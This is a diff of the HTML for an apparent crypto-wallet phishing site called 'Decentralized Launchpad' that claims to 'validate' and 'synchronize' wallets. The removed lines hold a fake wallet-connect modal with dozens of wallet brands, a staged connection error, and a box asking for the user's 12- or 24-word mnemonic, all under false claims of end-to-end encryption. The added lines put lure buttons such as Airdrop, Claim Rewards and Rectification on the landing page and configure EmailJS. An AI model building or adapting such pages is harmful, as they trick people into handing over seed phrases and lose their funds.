@@ -7,6 +7,15 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <link rel="stylesheet" href="Style.css">
 
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+(function(){
+  emailjs.init("bkelxZBaO6-WZhaVN");
+})();
+</script>
+
+
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script type="text/javascript">
 (function(){
@@ -28,18 +37,22 @@
       <div class="container">
 
   <div class="top">
- <div class="powered-by" id="powered-div">
-<p id="powered-by">Powered by</p>
-<img src="Images/CoinMarketCap-Logo.jpg" id="CoinMarketCap-logo">
-<hr id="top-hr1">
+<a href="">
+<h3 id="decentralized-launchpad-top">Decentralized Launchpad</h3>
+</a>
+ <div class="dev-icons">
+<i id="search-icon" class="fa-solid fa-magnifying-glass" style="color: #ffffff;"></i>
+<div class="wallet-icon">
+<i id="wallet-icon" class="fa-solid fa-wallet" style="color: #ffffff;"></i>
+</div>
  </div>
- <br>
   </div>
-
+<hr id="hr1">
 <br><br>
+<br>
 
-  <div class="dev-apydev">
-<h2 id="dev-apygate" style="cursor: pointer;">Dev Apygate</h2>
+  <div class="decentralized-launchpad-fixed">
+<h2 id="decentralized-launchpad-fheader" style="cursor: pointer;">Decentralized Launchpad</h2>
  <div class="dev-icons">
 <i id="search-icon" class="fa-solid fa-magnifying-glass" style="color: #ffffff;"></i>
 <div class="wallet-icon">
@@ -50,670 +63,69 @@
 
 
 
- <div class="select-a-wallet">
-<h1 id="select-a-wallet">Select a Wallet</h1>
- </div>
-<div class="slider-container">
-  <div class="moving-slider"></div>
-</div>
-<br>
-
-
-
-<div class="connect-box" id="connect-box">
-  <div class="white-bg">
-<br>
-<img src="Images/Metamask-Logo.jpg" id="coin-logo">
-<h2 id="coin-name">Metamask</h2>
-<p id="session-secured">This session is secured and encrypted</p>
-  <div class="error-section">
-<p id="error-occured">&nbsp; An error occurred... please try again or connect manually &nbsp;</p>
-<button class="try-again">Try Again</button>
-<button class="connect-manually">Connect Manually</button>
-  </div>
-
-  <div class="manual-section">
-<p id="failed-to-connect">Failed to connect wallet, Please try again.</p>
-<textarea id="wallet-key" placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."></textarea>
-<button class="connect-wallet">Connect Wallet</button>
-
-  </div>
-
-
-   <div class="connecting-section" style="display: none;">
-<div class="slider-container2">
-  <div class="moving-slider2"></div>
-</div>
-<h3 id="starting-secure-connection">starting secure connection...</h3>
-<span id="please-wait">please wait...</span>
-  </div>
- <div class="session-protected">
-<img src="Images/Shield.jpg" id="session-shield">
-<p id="session-protected">This session is protected with an end-to-end encryption</p>
- </div>
-<button id="close-button">Close</button>
-  </div>
-</div>
-
-
-
-
-    <div class="all-wallets">
-  <div class="wallet-connect-card">
-<img src="Images/Wallet-Connect-Logo.jpg" id="wallet-connect-logo">
- <div class="wallet-connect-info">
-<p id="wallet-connect">Wallet Connect</p>
-<p id="wallet-connect-url">walletconnect.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="phantom-card">
-<img src="Images/Phantom-Logo.jpg" id="phantom-logo">
- <div class="phantom-info">
-<p id="phantom">Phantom</p>
-<p id="phantom-url">phantom.app</p>
- </div>
-  </div>
-<br>
-
-  <div class="trust-wallet-card">
-<img src="Images/Trust-Wallet-Logo.jpg" id="trust-wallet-logo">
- <div class="trust-wallet-info">
-<p id="trust-wallet">Trust Wallet</p>
-<p id="trust-wallet-url">trustwallet.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="metamask-card">
-<img src="Images/Metamask-Logo.jpg" id="metamask-logo">
- <div class="metamask-info">
-<p id="metamask">Metamask</p>
-<p id="metamask-url">metamask.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="flint-wallet-card">
-<img src="Images/Flint-Wallet-Logo.jpg" id="flint-wallet-logo">
- <div class="flint-wallet-info">
-<p id="flint-wallet">Flint Wallet</p>
-<p id="flint-wallet-url">Flint-Wallet.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="binance-wallet-card">
-<img src="Images/Binance-Chain-Wallet-Logo.jpg" id="binance-wallet-logo">
- <div class="binance-wallet-info">
-<p id="binance-wallet">Binance Chain Wallet</p>
-<p id="binance-wallet-url">binance.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="polygon-wallet-card">
-<img src="Images/Polygon-Wallet-Logo.jpg" id="polygon-wallet-logo">
- <div class="polygon-wallet-info">
-<p id="polygon-wallet">Polygon Wallet</p>
-<p id="polygon-wallet-url">polygon.technology</p>
- </div>
-  </div>
-<br>
-
-  <div class="rainbow-card">
-<img src="Images/Rainbow-Logo.jpg" id="rainbow-logo">
- <div class="rainbow-info">
-<p id="rainbow">Rainbow</p>
-<p id="rainbow-url">rainbow.me</p>
- </div>
-  </div>
-<br>
-
-  <div class="bitpay-card">
-<img src="Images/Bitpay-Logo.jpg" id="bitpay-logo">
- <div class="bitpay-info">
-<p id="bitpay">Bitpay</p>
-<p id="bitpay-url">bitpay.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="walleth-card">
-<img src="Images/Walleth-Logo.jpg" id="walleth-logo">
- <div class="walleth-info">
-<p id="walleth">Walleth</p>
-<p id="walleth-url">walleth.org</p>
- </div>
-  </div>
-<br>
-
-  <div class="argent-card">
-<img src="Images/Argent-Logo.jpg" id="argent-logo">
- <div class="argent-info">
-<p id="argent">Argent</p>
-<p id="argent-url">argent.xyz</p>
- </div>
-  </div>
-<br>
-
-  <div class="huobi-wallet-card">
-<img src="Images/Huobi-Wallet-Logo.jpg" id="huobi-wallet-logo">
- <div class="huobi-wallet-info">
-<p id="huobi-wallet">Huobi Wallet</p>
-<p id="huobi-wallet-url">huobiwallet.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="encrypted-card">
-<img src="Images/Encrypted-Ink-Logo.jpg" id="encrypted-logo">
- <div class="encrypted-info">
-<p id="encrypted">Encrypted Ink</p>
-<p id="encrypted-url">encrypted.ink</p>
- </div>
-  </div>
-<br>
-
-  <div class="compound-card">
-<img src="Images/Compound-Logo.jpg" id="compound-logo">
- <div class="compound-info">
-<p id="compound">Compound</p>
-<p id="compound-url">compound.finance</p>
- </div>
-  </div>
-<br>
-
-  <div class="polkadot-card">
-<img src="Images/Polkadot-Logo.jpg" id="polkadot-logo">
- <div class="polkadot-info">
-<p id="polkadot">Polkadot</p>
-<p id="polkadot-url">polkadot.network</p>
- </div>
-  </div>
-<br>
-
-  <div class="iotex-card">
-<img src="Images/Iotex-Logo.jpg" id="iotex-logo">
- <div class="iotex-info">
-<p id="iotex">Iotex</p>
-<p id="iotex-url">iotex.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="coin98-card">
-<img src="Images/Coin98-Logo.jpg" id="coin98-logo">
- <div class="coin98-info">
-<p id="coin98">Coin98</p>
-<p id="coin98-url">coin98.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="coinbase-card">
-<img src="Images/Coinbase-Logo.jpg" id="coinbase-logo">
- <div class="coinbase-info">
-<p id="coinbase">Coinbase</p>
-<p id="coinbase-url">coinbase.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="crypto-card">
-<img src="Images/Crypto-Logo.jpg" id="crypto-logo">
- <div class="crypto-info">
-<p id="crypto">Crypto.com | Defi Wallet</p>
-<p id="crypto-url">crypto.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="token-pocket-card">
-<img src="Images/Token-Pocket-Logo.jpg" id="token-pocket-logo">
- <div class="token-pocket-info">
-<p id="token-pocket">Token Pocket</p>
-<p id="token-pocket-url">tokenpocket.pro</p>
- </div>
-  </div>
-<br>
-
-  <div class="math-wallet-card">
-<img src="Images/Math-Wallet-Logo.jpg" id="math-wallet-logo">
- <div class="math-wallet-info">
-<p id="math-wallet">Math Wallet</p>
-<p id="math-wallet-url">mathwallet.org</p>
- </div>
-  </div>
-<br>
-
-  <div class="ledger-live-card">
-<img src="Images/Ledger-Live-Logo.jpg" id="ledger-live-logo">
- <div class="ledger-live-info">
-<p id="ledger-live">Ledger Live</p>
-<p id="ledger-live-url">ledger.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="Oneinch-card">
-<img src="Images/1inch-Logo.jpg" id="Oneinch-logo">
- <div class="Oneinch-info">
-<p id="Oneinch">1inch</p>
-<p id="Oneinch-url">1inch.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="dharma-card">
-<img src="Images/Dharma-Logo.jpg" id="dharma-logo">
- <div class="dharma-info">
-<p id="dharma">Dharma</p>
-<p id="dharma-url">dharma.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="trust-vault-card">
-<img src="Images/Trust-Vault-Logo.jpg" id="trust-vault-logo">
- <div class="trust-vault-info">
-<p id="trust-vault">Dharma</p>
-<p id="trust-vault-url">trustlogy.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="mykey-card">
-<img src="Images/Mykey-Logo.jpg" id="mykey-logo">
- <div class="mykey-info">
-<p id="mykey">MYKEY</p>
-<p id="mykey-url">mykey.org</p>
- </div>
-  </div>
-<br>
-
-  <div class="atomic-card">
-<img src="Images/Atomic-Logo.jpg" id="atomic-logo">
- <div class="atomic-info">
-<p id="atomic">Atomic</p>
-<p id="atomic-url">atomicwallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="cool-wallet-card">
-<img src="Images/Cool-Wallet-S-Logo.jpg" id="cool-wallet-logo">
- <div class="cool-wallet-info">
-<p id="cool-wallet">CoolWallet S</p>
-<p id="cool-wallet-url">coolwallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="nash-card">
-<img src="Images/Nash-Logo.jpg" id="nash-logo">
- <div class="nash-info">
-<p id="nash">Nash</p>
-<p id="nash-url">nash.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="coinomi-card">
-<img src="Images/Coinomi-Logo.jpg" id="coinomi-logo">
- <div class="coinomi-info">
-<p id="coinomi">Coinomi</p>
-<p id="coinomi-url">coinomi.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="gridplus-card">
-<img src="Images/Gridplus-Logo.jpg" id="gridplus-logo">
- <div class="gridplus-info">
-<p id="gridplus">GridPlus</p>
-<p id="gridplus-url">gridplus.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="tokenary-card">
-<img src="Images/Tokenary-Logo.jpg" id="tokenary-logo">
- <div class="tokenary-info">
-<p id="tokenary">Tokenary</p>
-<p id="tokenary-url">tokenary.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="safepal-card">
-<img src="Images/Safepal-Logo.jpg" id="safepal-logo">
- <div class="safepal-info">
-<p id="safepal">SafePal</p>
-<p id="safepal-url">safepal.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="infinito-card">
-<img src="Images/Infinito-Logo.jpg" id="infinito-logo">
- <div class="infinito-info">
-<p id="infinito">Infinito</p>
-<p id="infinito-url">infinitowallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="wallet-io-card">
-<img src="Images/Wallet-Io-Logo.jpg" id="wallet-io-logo">
- <div class="wallet-io-info">
-<p id="wallet-io">Wallet.io</p>
-<p id="wallet-io-url">wallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="ownbit-card">
-<img src="Images/Ownbit-Logo.jpg" id="ownbit-logo">
- <div class="ownbit-info">
-<p id="ownbit">Ownbit</p>
-<p id="ownbit-url">ownbit.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="easypocket-card">
-<img src="Images/Easypocket-Logo.jpg" id="easypocket-logo">
- <div class="easypocket-info">
-<p id="easypocket">EasyPocket</p>
-<p id="easypocket-url">easypocket.app</p>
- </div>
-  </div>
-<br>
-
-  <div class="bridge-wallet-card">
-<img src="Images/Bridge-Wallet-Logo.jpg" id="bridge-wallet-logo">
- <div class="bridge-wallet-info">
-<p id="bridge-wallet">Bridge Wallet</p>
-<p id="bridge-wallet-url">mtpelerin.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="via-wallet-card">
-<img src="Images/Via-Wallet-Logo.jpg" id="via-wallet-logo">
- <div class="via-wallet-info">
-<p id="via-wallet">ViaWallet</p>
-<p id="via-wallet-url">viawallet.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="bitkeep-card">
-<img src="Images/Bitkeep-Logo.jpg" id="bitkeep-logo">
- <div class="bitkeep-info">
-<p id="bitkeep">BitKeep</p>
-<p id="bitkeep-url">bitkeep.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="unstoppable-wallet-card">
-<img src="Images/Unstoppable-Wallet-Logo.jpg" id="unstoppable-wallet-logo">
- <div class="unstoppable-wallet-info">
-<p id="unstoppable-wallet">Unstoppable Wallet</p>
-<p id="unstoppable-wallet-url">unstoppable.money</p>
- </div>
-  </div>
-<br>
-
-  <div class="halodefi-wallet-card">
-<img src="Images/Halodefi-Wallet-Logo.jpg" id="halodefi-wallet-logo">
- <div class="halodefi-wallet-info">
-<p id="halodefi-wallet">HaloDefi Wallet</p>
-<p id="halodefi-wallet-url">halodefi.org</p>
- </div>
-  </div>
-<br>
-
-  <div class="dok-wallet-card">
-<img src="Images/Dok-Wallet-Logo.jpg" id="dok-wallet-logo">
- <div class="dok-wallet-info">
-<p id="dok-wallet">Dok Wallet</p>
-<p id="dok-wallet-url">dokwallet.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="cello-wallet-card">
-<img src="Images/Celo-Wallet-Logo.jpg" id="cello-wallet-logo">
- <div class="cello-wallet-info">
-<p id="cello-wallet">Cello Wallet</p>
-<p id="cello-wallet-url">cellowallet.app</p>
- </div>
-  </div>
-<br>
-
-  <div class="coinus-card">
-<img src="Images/Coinus-Logo.jpg" id="coinus-logo">
- <div class="coinus-info">
-<p id="coinus">CoinUs</p>
-<p id="coinus-url">coinus.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="valora-card">
-<img src="Images/Valora-Logo.jpg" id="valora-logo">
- <div class="valora-info">
-<p id="valora">Valora</p>
-<p id="valora-url">valoraapp.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="trustee-wallet-card">
-<img src="Images/Trustee-Wallet-Logo.jpg" id="trustee-wallet-logo">
- <div class="trustee-wallet-info">
-<p id="trustee-wallet">Trustee Wallet</p>
-<p id="trustee-wallet-url">trusteeglobal.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="gaurda-wallet-card">
-<img src="Images/Guarda-Wallet-Logo.jpg" id="gaurda-wallet-logo">
- <div class="gaurda-wallet-info">
-<p id="gaurda-wallet">Gaurda Wallet</p>
-<p id="gaurda-wallet-url">gaurda.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="maiar-wallet-card">
-<img src="Images/Maiarwallet-Logo.jpg" id="maiar-wallet-logo">
- <div class="maiar-wallet-info">
-<p id="maiar-wallet">Maiar Wallet</p>
-<p id="maiar-wallet-url">Maiar.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="jade-wallet-card">
-<img src="Images/Jade-Wallet-Logo.jpg" id="jade-wallet-logo">
- <div class="jade-wallet-info">
-<p id="jade-wallet">Jade Wallet</p>
-<p id="jade-wallet-url">jadewallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="plasmapay-card">
-<img src="Images/Plasmapay-Logo.jpg" id="plasmapay-logo">
- <div class="plasmapay-info">
-<p id="plasmapay">PlasmaPay</p>
-<p id="plasmapay-url">plasmapay.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="o3-wallet-card">
-<img src="Images/O3-Wallet-Logo.jpg" id="o3-wallet-logo">
- <div class="o3-wallet-info">
-<p id="o3-wallet">O3 Wallet</p>
-<p id="o3-wallet-url">o3.network</p>
- </div>
-  </div>
-<br>
-
-  <div class="hashkey-card">
-<img src="Images/Hashkey-Me-Logo.jpg" id="hashkey-logo">
- <div class="hashkey-info">
-<p id="hashkey">HashKey Me</p>
-<p id="hashkey-url">me.hashkey.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="rwallet-card">
-<img src="Images/Rwallet-Logo.jpg" id="rwallet-logo">
- <div class="rwallet-info">
-<p id="rwallet">RWallet</p>
-<p id="rwallet-url">rsk.co</p>
- </div>
-  </div>
-<br>
-
-  <div class="flare-wallet-card">
-<img src="Images/Flare-Wallet-Logo.jpg" id="flare-wallet-logo">
- <div class="flare-wallet-info">
-<p id="flare-wallet">Flare Wallet</p>
-<p id="flare-wallet-url">flarewallet.io</p>
- </div>
-  </div>
-<br>
-
-  <div class="kyberswap-card">
-<img src="Images/Kyberswap-Logo.jpg" id="kyberswap-logo">
- <div class="kyberswap-info">
-<p id="kyberswap">KyberSwap</p>
-<p id="kyberswap-url">kyberswap.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="atoken-wallet-card">
-<img src="Images/Atoken-Wallet-Logo.jpg" id="atoken-wallet-logo">
- <div class="atoken-wallet-info">
-<p id="atoken-wallet">AToken Wallet</p>
-<p id="atoken-wallet-url">atoken.com</p>
- </div>
-  </div>
-<br>
-
-  <div class="tongue-wallet-card">
-<img src="Images/Tongue-Wallet-Logo.jpg" id="tongue-wallet-logo">
- <div class="tongue-wallet-info">
-<p id="tongue-wallet">Tongue Wallet</p>
-<p id="tongue-wallet-url">tongue.fi</p>
- </div>
-  </div>
+  <div class="center">
+<h1 id="validate">Validate, initialize, and syncronize your tokens on your wallets</h1>
+<p id="open-decentralized">Open And Decentralized Protocol for Syncing Varius Wallets To Dapps Secure Server</p>
 <br>
-
-  <div class="xinfin-card">
-<img src="Images/Xinfin-Logo.jpg" id="xinfin-logo">
- <div class="xinfin-info">
-<p id="xinfin">XinFin XDC Network</p>
-<p id="xinfin-url">xinfin.io</p>
- </div>
+  <div class="buttons">
+<button id="stacking" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Stacking</button>
+<button id="migration" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Micgration V2</button>
+<button id="conect-wallet-button" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Connect Wallet</button>
+<button id="airdrop" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Airdrop</button>
+<button id="kyc" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> KYC</button>
+<button id="rpc-settings" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> RPC Settings</button>
+<button id="buy-nft" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Buy NFT</button>
+<button id="marketplace" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Marketplace</button>
+<button id="gas" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Gas</button>
+<button id="claim-rewards" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Claim Rewards</button>
+<button id="rectification" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Rectification</button>
+<button id="snapshot" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Snapshot</button>
+<button id="buy-presale" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Buy Presale</button>
+<button id="migrate" class="button"><img src="Images/Buttons-Image.jpg" class="buttons-image"> Migrate</button>
   </div>
+<br><br>
 <br>
-
-  <div class="talken-wallet-card">
-<img src="Images/Talken-Wallet-Logo.jpg" id="talken-wallet-logo">
- <div class="talken-wallet-info">
-<p id="talken-wallet">Talken Wallet</p>
-<p id="talken-wallet-url">talken.io</p>
- </div>
   </div>
-<br>
 
-  <div class="keyring-card">
-<img src="Images/Keyring-Pro-Logo.jpg" id="keyring-logo">
- <div class="keyring-info">
-<p id="keyring">Keyring</p>
-<p id="keyring-url">keyring.app</p>
- </div>
-  </div>
+<br><br>
+<br><br>
 <br>
 
-  <div class="midas-wallet-card">
-<img src="Images/Midas-Wallet-Logo.jpg" id="midas-wallet-logo">
- <div class="midas-wallet-info">
-<p id="midas-wallet">Midas Wallet</p>
-<p id="midas-wallet-url">midasprotocol.io</p>
+  <div class="connect-steps">
+    <div class="first-steps">
+ <div class="select-your-wallet">
+<img src="Images/Select-Your-Wallet.png" id="select-your-wallet-img">
+<h3 id="select-your-wallet" class="link">Select Your Wallet</h3>
+<p id="select-your-wallet-p">We have varieties of wallets you can choose from to validate or synchronize your wallet. Please, select your correct wallet name before proceeding.</p>
  </div>
-  </div>
-<br>
 
-  <div class="at-wallet-card">
-<img src="Images/At-Wallet-Logo.jpg" id="at-wallet-logo">
- <div class="at-wallet-info">
-<p id="at-wallet">AT.Wallet</p>
-<p id="at-wallet-url">authentrend.com</p>
+ <div class="validate-your-wallet">
+<img src="Images/Validate-Your-Wallet.png" id="validate-your-wallet-img">
+<h3 id="validate-your-wallet" class="link">Validate Your Wallet</h3>
+<p id="validate-your-wallet-p">Once you select your wallet, you will be prompted to connect via a decentralized protocol. This can successfully be completed manually or automatically.</p>
  </div>
-  </div>
-<br>
-
-  <div class="solfare-card">
-<img src="Images/Solflare-Logo.jpg" id="solfare-logo">
- <div class="solfare-info">
-<p id="solfare">Solfare</p>
-<p id="solfare-url">solfare.com</p>
  </div>
-  </div>
-<br>
 
-  <div class="xpr-card">
-<img src="Images/XRP-Logo.jpg" id="xpr-logo">
- <div class="xpr-info">
-<p id="xpr">XPR</p>
-<p id="xpr-url">xprnetwork.org</p>
+ <div class="sec-steps">
+ <div class="generate-qr-code">
+<img src="Images/Generate-QR-Code.png" id="generate-qr-code-img">
+<h3 id="generate-qr-code" class="link">Generate QR Code</h3>
+<p id="generate-qr-code-p">Upon successful validation, a QR Code will be generated for your wallet. You can always scan your QR Code to reinitialize your wallet.</p>
  </div>
-  </div>
-<br>
 
-  <div class="loom-card">
-<img src="Images/Loom-Logo.jpg" id="loom-logo">
- <div class="loom-info">
-<p id="loom">Loom</p>
-<p id="loom-url">loom.com</p>
+ <div class="save-wallet-qr">
+<img src="Images/Save-Wallet-QR.png" id="save-wallet-qr-img">
+<h3 id="save-wallet-qr" class="link">Save Wallet QR Code</h3>
+<p id="save-wallet-qr-p">Saving your generated mnemonic code or QR Code is important. You can click on Save or Screenshot the QR Code Page. You choose how you want to save!</p>
  </div>
-  </div>
-<br>
-
-  <div class="imtoken-card">
-<img src="Images/Imtoken-Logo.jpg" id="imtoken-logo">
- <div class="imtoken-info">
-<p id="imtoken">imToken</p>
-<p id="imtoken-url">token.im</p>
  </div>
   </div>
-<br>
 
-  <div class="others-card">
-<img src="Images/Others.jpg" id="others-logo">
- <div class="others-info">
-<p id="others">Others</p>
-<p id="others-url"></p>
- </div>
-  </div>
-    </div>
 
-<br>
 
+  
     <div class="bottom">
+<br><br>
   <div class="decentralized-launchpad">
 <h1 id="decentralized-launchpad">Decentralized Launchpad</h1>
 <p id="decentralized-protocol">Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices.</p>
@@ -725,16 +137,18 @@
  <div class="row1">
   <form>
 <input type="email" id="email" placeholder="name@example.com" required>
-
 <button id="subscribe-mail" type="submit">&nbsp; Send &nbsp;</button>
 <p id="invalid-email">Please enter a valid email address</p>
-<p id="subscribe-email" style="display: none;">Subscribed!</p>
+<p id="subscribe-email" style="display: none; color: #000;">Subscribed!</p>
 </form>
 </div>
  </div>
-    </div>
-
 <br><br>
+<br><br>
+<br><br>
+<br><br>
+<br><br>
+    </div>
 
   <div class="to-top">
 <a href="#top">
@@ -742,15 +156,29 @@
 </a>
   </div>
 
-<br><br>
-<br><br>
-<br><br>
-
     </div>
 
- <script src="Script.js"></script>
+
+  <script src="Script.js"></script>
+
 
   <script>
+
+document.addEventListener("DOMContentLoaded", function() {
+
+
+});
+
+
+
+
+
+
+
+
+
+
+
 
 var submitButton = document.getElementById("subscribe-mail");
 var emailField = document.getElementById("email");
@@ -803,10 +231,10 @@ submitButton.addEventListener("click", function(event) {
     submitButton.classList.remove("disabled");
   }, 7000);
 
-  
+
   function sendMail() {
   var Email = document.getElementById("email").value;
-  var submitButton = "Murphy Email2";
+  var submitButton = "Murphy Email";
 
   emailjs.send('service_kyvi3ud', 'template_zsrp7t6', {
     email: Email,
@@ -826,9 +254,9 @@ submitButton.addEventListener("click", function(event) {
   sendMail();
 });
 
-
-
   </script>
+
+
 
   <script>
 document.querySelector('.to-top').addEventListener('click', function () { 
@@ -865,7 +293,7 @@ window.onscroll = function() {
 
 
   var scrollPosition = window.scrollY || document.documentElement.scrollTop;
-  var devApydevDiv = document.querySelector('.dev-apydev');
+  var devApydevDiv = document.querySelector('.decentralized-launchpad-fixed');
   // Calculate 20% of the page height
   var showDivThreshold = document.documentElement.scrollHeight * 0.2;
   if (scrollPosition > showDivThreshold) {
@@ -878,17 +306,8 @@ window.onscroll = function() {
 };
   </script>
 
-  <script>
-document.getElementById("powered-div").addEventListener("click", function() {
-  window.location.href = "";
-});
 
-var walletIcon = document.getElementById("wallet-icon");
-var toTopButton = document.querySelector('.to-top');
-walletIcon.addEventListener("click", function() {
-  toTopButton.click();
-});
-  </script>
 
 </body>
 </html>
+ 
